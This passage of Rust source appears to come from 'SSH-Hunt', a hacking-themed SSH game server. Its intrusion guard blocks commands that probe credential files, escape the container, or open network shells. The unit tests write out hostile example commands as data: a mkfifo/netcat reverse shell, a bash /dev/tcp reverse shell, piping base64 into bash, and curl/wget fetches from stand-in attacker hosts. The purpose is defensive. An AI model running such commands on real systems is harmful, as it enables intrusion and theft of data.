        "dumb" | "cons25" | "linux" | "ansi" | "vt100" | "vt102" | "vt220"
    )
}

fn locale_supports_unicode(locale: &str) -> bool {
    let l = locale.trim().to_ascii_lowercase();
    l.contains("utf-8") || l.contains("utf8")
}

fn strip_ansi_sequences(input: &str) -> String {
    let bytes = input.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0usize;
    while i < bytes.len() {
        if bytes[i] != 0x1b {
            out.push(bytes[i]);
            i += 1;
            continue;
        }

        i += 1;
        if i >= bytes.len() {
            break;
        }
        if bytes[i] == b'[' {
            i += 1;
            while i < bytes.len() {
                let b = bytes[i];
                i += 1;
                if (b'@'..=b'~').contains(&b) {
                    break;
                }
            }
            continue;
        }

        i += 1;
    }

    String::from_utf8_lossy(&out).into_owned()
}

fn normalize_line_endings(input: &str) -> String {
    let mut out = String::with_capacity(input.len() + 8);
    let mut prev_was_cr = false;
    for ch in input.chars() {
        match ch {
            '\n' => {
                if !prev_was_cr {
                    out.push('\r');
                }
                out.push('\n');
                prev_was_cr = false;
            }
            '\r' => {
                out.push('\r');
                prev_was_cr = true;
            }
            _ => {
                out.push(ch);
                prev_was_cr = false;
            }
        }
    }
    out
}

fn escape_attempt_reason(line: &str) -> Option<&'static str> {
    let lower = line.to_ascii_lowercase();
    let trimmed = lower.trim();
    let checks: [(&str, &str); 20] = [
        ("std::process::command", "forbidden host process API probe"),
        (
            "tokio::process::command",
            "forbidden async process API probe",
        ),
        ("/var/run/docker.sock", "container socket breakout probe"),
        ("/proc/", "host filesystem probe"),
        ("/etc/passwd", "host credential probe"),
        ("/root/.ssh", "root credential probe"),
        ("powershell.exe", "host shell invocation attempt"),
        ("pwsh -", "host shell invocation attempt"),
        ("cmd.exe /c", "host shell invocation attempt"),
        ("/etc/shadow", "host shadow file probe"),
        ("/etc/sudoers", "host privilege escalation probe"),
        ("/etc/crontab", "host cron probe"),
        ("/dev/mem", "host memory device probe"),
        ("ld_preload", "dynamic linker injection probe"),
        ("ld_library_path=/", "dynamic linker path injection probe"),
        ("/proc/self", "host process self-probe"),
        ("mkfifo", "named pipe reverse shell probe"),
        ("base64 -d", "encoded payload execution probe"),
        ("/dev/tcp/", "bash tcp redirect probe"),
        ("/dev/udp/", "bash udp redirect probe"),
    ];

    for (needle, reason) in checks {
        if trimmed.contains(needle) {
            return Some(reason);
        }
    }

    let mut normalized = String::with_capacity(trimmed.len());
    for ch in trimmed.chars() {
        if matches!(ch, '|' | ';' | '&') {
            normalized.push('\n');
        } else {
            normalized.push(ch);
        }
    }

    for segment in normalized.lines() {
        let mut parts = segment.split_whitespace();
        let Some(cmd) = parts.next() else {
            continue;
        };
        let rest = parts.collect::<Vec<_>>();
        match cmd {
            "/bin/bash" | "/bin/sh" | "/bin/zsh" | "powershell" | "powershell.exe" | "pwsh"
            | "cmd" | "cmd.exe" | "zsh" | "fish" => {
                return Some("host shell invocation attempt");
            }
            "bash" | "sh" => {
                if rest.first() == Some(&"-c") {
                    return Some("host shell execution attempt");
                }
                return Some("host shell escalation attempt");
            }
            "python" | "python3" | "perl" | "ruby" | "node" | "lua" | "php" => {
                if rest.contains(&"-c")
                    || rest.contains(&"-e")
                    || rest.contains(&"-r")
                    || rest.contains(&"--eval")
                {
                    return Some("runtime escape attempt");
                }
                return Some("runtime interpreter launch attempt");
            }
            "sudo" | "su" => return Some("privilege escalation attempt"),
            "docker" | "podman" => return Some("container breakout tooling probe"),
            "nsenter" => return Some("namespace escape attempt"),
            "chroot" => return Some("chroot escape attempt"),
            "systemctl" => return Some("host service control probe"),
            "nc" | "ncat" | "netcat" | "socat" => return Some("network pivot attempt"),
            "nmap" | "masscan" | "zmap" => return Some("network scan attempt"),
            "ssh" | "scp" | "sftp" | "telnet" | "ftp" | "rsh" | "rlogin" => {
                return Some("network pivot attempt");
            }
            "curl" | "wget" => {
                if rest
                    .iter()
                    .any(|arg| arg.starts_with("http://") || arg.starts_with("https://"))
                {
                    return Some("external host/network call attempt");
                }
            }
            _ => {}
        }
    }

    None
}

fn is_game_command(cmd: &str) -> bool {
    matches!(
        cmd,
        "help"
            | "guide"
            | "briefing"
            | "tutorial"
            | "missions"
            | "accept"
            | "submit"
            | "inventory"
            | "shop"
            | "auction"
            | "chat"
            | "mail"
            | "party"
            | "mode"
            | "gate"
            | "keyvault"
            | "settings"
            | "status"
            | "events"
            | "leaderboard"
            | "scripts"
            | "daily"
            | "tier"
            | "pvp"
            | "relay"
    )
}

fn mission_track_label(required: bool, starter: bool) -> &'static str {
    if required {
        "required"
    } else if starter {
        "starter"
    } else {
        "advanced"
    }
}

struct ScriptMarketEntry {
    name: &'static str,
    description: &'static str,
    source: &'static str,
}

fn script_market() -> &'static [ScriptMarketEntry] {
    &[
        ScriptMarketEntry {
            name: "node-scan",
            description: "List visible NetCity nodes",
            source: "let nodes = scan_nodes(); for n in nodes { print(n); }",
        },
        ScriptMarketEntry {
            name: "token-hunt",
            description: "Extract token lines from mission logs",
            source: r#"let data = read_virtual("/logs/neon-gateway.log"); print(grep(data, "token"));"#,
        },
        ScriptMarketEntry {
            name: "warn-trace",
            description: "Trace warning signals in gateway logs",
            source: r#"let data = read_virtual("/logs/neon-gateway.log"); print(grep(data, "WARN"));"#,
        },
        ScriptMarketEntry {
            name: "error-pulse",
            description: "Surface ERROR entries from gateway logs",
            source: r#"let data = read_virtual("/logs/neon-gateway.log"); print(grep(data, "ERROR"));"#,
        },
        ScriptMarketEntry {
            name: "node-count",
            description: "Count visible nodes in the current sector",
            source: "let nodes = scan_nodes(); print(nodes.len);",
        },
        ScriptMarketEntry {
            name: "auth-sweep",
            description: "Count rejected auth attempts from auth log",
            source: r#"let data = read_virtual("/var/log/auth.log"); print(grep(data, "REJECT"));"#,
        },
        ScriptMarketEntry {
            name: "inventory-sku",
            description: "Extract SKU field from the data inventory",
            source: r#"let data = read_virtual("/data/inventory.tsv"); print(grep(data, "nb-"));"#,
        },
        ScriptMarketEntry {
            name: "error-filter",
            description: "Extract ERROR and FATAL lines from events log (regex-hunt)",
            source: r#"let data = read_virtual("/var/log/events.log"); print(grep(data, "ERROR"));"#,
        },
        ScriptMarketEntry {
            name: "top-score",
            description: "Extract top-scorer name from pipeline.csv (pipeline-pro)",
            source: r#"let data = read_virtual("/data/pipeline.csv"); print(grep(data, "neo"));"#,
        },
        ScriptMarketEntry {
            name: "config-dump",
            description: "Display current sim-config values (var-play)",
            source: r#"let data = read_virtual("/etc/sim-config"); print(data);"#,
        },
        ScriptMarketEntry {
            name: "json-keys",
            description: "Extract key names from node-status.json (json-crack)",
            source: r#"let data = read_virtual("/data/node-status.json"); print(grep(data, ":"));"#,
        },
        ScriptMarketEntry {
            name: "seq-report",
            description: "List numbered tasks from tasks.txt (seq-master)",
            source: r#"let data = read_virtual("/home/player/tasks.txt"); print(data);"#,
        },
        ScriptMarketEntry {
            name: "col-format",
            description: "Format netmap.tsv as aligned table (column-view)",
            source: r#"let data = read_virtual("/data/netmap.tsv"); print(data);"#,
        },
    ]
}

fn style_metrics(parsed: &shell::ParsedLine) -> Option<(usize, usize)> {
    if parsed.segments.is_empty() {
        return None;
    }

    let mut max_chain_depth = 0usize;
    let mut unique_tools = HashSet::new();
    for segment in &parsed.segments {
        max_chain_depth = max_chain_depth.max(segment.pipeline.commands.len());
        for cmd in &segment.pipeline.commands {
            unique_tools.insert(cmd.program.clone());
        }
    }

    if max_chain_depth < 2 && unique_tools.len() < 3 {
        return None;
    }

    Some((max_chain_depth, unique_tools.len()))
}

fn sha256_hex(input: &str) -> String {
    use sha2::{Digest, Sha256};

    let mut hasher = Sha256::new();
    hasher.update(input.as_bytes());
    format!("{:x}", hasher.finalize())
}

fn generate_admin_keypair(passphrase: &str) -> Result<(String, String)> {
    let mut rng = OsRng;
    let private = russh::keys::PrivateKey::random(&mut rng, russh::keys::Algorithm::Ed25519)?;
    let encrypted = private.encrypt(&mut rng, passphrase)?;
    let private_blob = encrypted
        .to_openssh(russh::keys::ssh_key::LineEnding::LF)?
        .to_string();
    let public_line = private.public_key().to_openssh()?;
    Ok((public_line, private_blob))
}

fn load_or_generate_host_key(path: &Path) -> Result<russh::keys::PrivateKey> {
    if let Ok(key) = russh::keys::PrivateKey::read_openssh_file(path) {
        info!(path = %path.display(), "loaded persistent SSH host key");
        return Ok(key);
    }

    let mut rng = OsRng;
    let key = russh::keys::PrivateKey::random(&mut rng, russh::keys::Algorithm::Ed25519)?;

    if let Some(parent) = path.parent() {
        if let Err(err) = std::fs::create_dir_all(parent) {
            warn!(
                path = %path.display(),
                error = ?err,
                "unable to create host key directory; using ephemeral key for this run"
            );
            return Ok(key);
        }
    }

    match key.write_openssh_file(path, russh::keys::ssh_key::LineEnding::LF) {
        Ok(()) => {
            info!(path = %path.display(), "wrote SSH host key");
            Ok(key)
        }
        Err(err) => {
            warn!(
                path = %path.display(),
                error = ?err,
                "unable to persist SSH host key; using ephemeral key for this run"
            );
            Ok(key)
        }
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();

    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| "info,ssh_hunt_server=debug".into()),
        )
        .with_target(false)
        .init();

    let config_path =
        std::env::var("GAME_CONFIG_PATH").unwrap_or_else(|_| "/data/config.yaml".to_owned());
    let admin_secret_path = std::env::var("ADMIN_SECRET_PATH")
        .unwrap_or_else(|_| "/data/secrets/admin.yaml".to_owned());
    let hidden_ops_path = std::env::var("HIDDEN_OPS_PATH")
        .unwrap_or_else(|_| "/data/secrets/hidden_ops.yaml".to_owned());
    let host_key_path = std::env::var("SSH_HOST_KEY_PATH")
        .unwrap_or_else(|_| "/data/secrets/ssh_host_ed25519".to_owned());

    let cfg = config::load_config(&config_path)?;
    let admin_secret = config::load_admin_secret(&admin_secret_path)?;
    let hidden_ops: HiddenOpsConfig = config::load_hidden_ops(&hidden_ops_path)?;

    if args.healthcheck {
        let db_url = std::env::var("DATABASE_URL").context("DATABASE_URL is required")?;
        let pool = timeout(Duration::from_secs(3), PgPool::connect(&db_url))
            .await
            .context("database healthcheck timed out")??;
        let _ping: i32 = sqlx::query_scalar("SELECT 1")
            .fetch_one(&pool)
            .await
            .context("database healthcheck query failed")?;
        println!("ok");
        return Ok(());
    }

    let db_url = std::env::var("DATABASE_URL").context("DATABASE_URL is required")?;
    let pool = PgPool::connect(&db_url).await?;
    sqlx::migrate!("../../migrations").run(&pool).await?;

    let world = Arc::new(WorldService::new(Some(pool), hidden_ops));
    let shell = Arc::new(ShellEngine::with_registry(builtins::default_registry()));
    let script = Arc::new(ScriptEngine::new(ScriptPolicy::default()));

    let app = Arc::new(AppState {
        cfg: cfg.clone(),
        world,
        shell,
        script,
        admin_secret,
    });

    let host_key = load_or_generate_host_key(Path::new(&host_key_path))
        .with_context(|| format!("unable to prepare host key at {host_key_path}"))?;

    let server_cfg = russh::server::Config {
        inactivity_timeout: Some(Duration::from_secs(3600)),
        auth_rejection_time: Duration::from_millis(250),
        auth_rejection_time_initial: Some(Duration::from_millis(0)),
        keys: vec![host_key],
        ..Default::default()
    };
    let server_cfg = Arc::new(server_cfg);

    let mut server = GameServer { app };
    let mut retry_delay = Duration::from_secs(1);
    loop {
        match TcpListener::bind(&cfg.server.listen).await {
            Ok(listener) => {
                info!(listen = %cfg.server.listen, "starting SSH-Hunt server");
                retry_delay = Duration::from_secs(1);
                match server.run_on_socket(server_cfg.clone(), &listener).await {
                    Ok(()) => warn!("server loop exited unexpectedly; restarting listener"),
                    Err(err) => error!(error = ?err, "server loop error; restarting listener"),
                }
            }
            Err(err) => {
                error!(
                    listen = %cfg.server.listen,
                    error = ?err,
                    "failed to bind SSH listener; retrying"
                );
            }
        }
        sleep(retry_delay).await;
        retry_delay = std::cmp::min(retry_delay * 2, Duration::from_secs(10));
    }

    #[allow(unreachable_code)]
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn style_metrics_requires_complexity() {
        let engine = ShellEngine::default();
        let env = HashMap::new();
        let simple = engine.parse("ls", &env).unwrap();
        assert!(style_metrics(&simple).is_none());

        let complex = engine
            .parse("cat /logs/neon-gateway.log | grep token | wc -l", &env)
            .unwrap();
        assert_eq!(style_metrics(&complex), Some((3, 3)));
    }

    #[test]
    fn intrusion_guard_flags_escape_attempts() {
        assert_eq!(
            escape_attempt_reason("bash -c 'id'"),
            Some("host shell execution attempt")
        );
        assert_eq!(
            escape_attempt_reason("pwsh --eval whoami"),
            Some("host shell invocation attempt")
        );
        assert_eq!(
            escape_attempt_reason("python3"),
            Some("runtime interpreter launch attempt")
        );
        assert_eq!(
            escape_attempt_reason("cat /var/run/docker.sock"),
            Some("container socket breakout probe")
        );
        assert_eq!(
            escape_attempt_reason("ssh admin@example.com"),
            Some("network pivot attempt")
        );
        assert_eq!(escape_attempt_reason("cat /logs/neon-gateway.log"), None);
        assert_eq!(escape_attempt_reason("echo docker"), None);
        assert_eq!(escape_attempt_reason("chat global bash -c 'id'"), None);

        // Extended pattern coverage
        assert_eq!(
            escape_attempt_reason("cat /etc/shadow"),
            Some("host shadow file probe")
        );
        assert_eq!(
            escape_attempt_reason("cat /etc/sudoers"),
            Some("host privilege escalation probe")
        );
        assert_eq!(
            escape_attempt_reason("LD_PRELOAD=/tmp/evil.so ls"),
            Some("dynamic linker injection probe")
        );
        assert_eq!(
            escape_attempt_reason("nmap -sV 10.0.0.1"),
            Some("network scan attempt")
        );
        assert_eq!(
            escape_attempt_reason("masscan --rate 1000 10.0.0.0/24"),
            Some("network scan attempt")
        );
        assert_eq!(
            escape_attempt_reason("rsh target-host"),
            Some("network pivot attempt")
        );
        assert_eq!(
            escape_attempt_reason("sudo su -"),
            Some("privilege escalation attempt")
        );
        assert_eq!(
            escape_attempt_reason("docker run --privileged alpine"),
            Some("container breakout tooling probe")
        );

        // New pattern coverage
        assert_eq!(
            escape_attempt_reason("mkfifo /tmp/f; nc -e /bin/bash host 4444"),
            Some("named pipe reverse shell probe")
        );
        assert_eq!(
            escape_attempt_reason("echo dGVzdA== | base64 -d | bash"),
            Some("encoded payload execution probe")
        );
        assert_eq!(
            escape_attempt_reason("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
            Some("bash tcp redirect probe")
        );
        assert_eq!(
            escape_attempt_reason("curl https://evil.example.com/shell.sh"),
            Some("external host/network call attempt")
        );
        assert_eq!(
            escape_attempt_reason("wget http://attacker.example.org/payload"),
            Some("external host/network call attempt")
        );
        assert_eq!(escape_attempt_reason("ls /logs"), None);
        assert_eq!(escape_attempt_reason("cat /data/inventory.tsv"), None);
    }

    #[test]
    fn prompt_user_is_sanitized() {
        assert_eq!(sanitize_prompt_user("snake8503"), "snake8503");
        assert_eq!(sanitize_prompt_user("neo@203.0.113.10"), "neo");
        assert_eq!(sanitize_prompt_user("\x1b[31mroot"), "root");
        assert_eq!(sanitize_prompt_user(""), "guest");
    }

    #[test]
    fn line_endings_are_normalized_for_cross_terminal_clients() {
        assert_eq!(normalize_line_endings("a\nb"), "a\r\nb");
        assert_eq!(normalize_line_endings("a\r\nb\n"), "a\r\nb\r\n");
    }

    #[test]
    fn terminal_capability_detection_is_reasonable() {
        assert!(terminal_supports_ansi("xterm-256color"));
        assert!(!terminal_supports_ansi("dumb"));
        assert!(terminal_supports_unicode("xterm-256color"));
        assert!(!terminal_supports_unicode("vt100"));
        assert!(locale_supports_unicode("en_US.UTF-8"));
        assert!(!locale_supports_unicode("C"));
    }

    #[test]
    fn guide_is_registered_as_game_command() {
        assert!(is_game_command("guide"));
        assert!(is_game_command("briefing"));
    }

    #[test]
    fn mission_track_labels_are_human_readable() {
        assert_eq!(mission_track_label(true, false), "required");
        assert_eq!(mission_track_label(false, true), "starter");
        assert_eq!(mission_track_label(false, false), "advanced");
    }
}
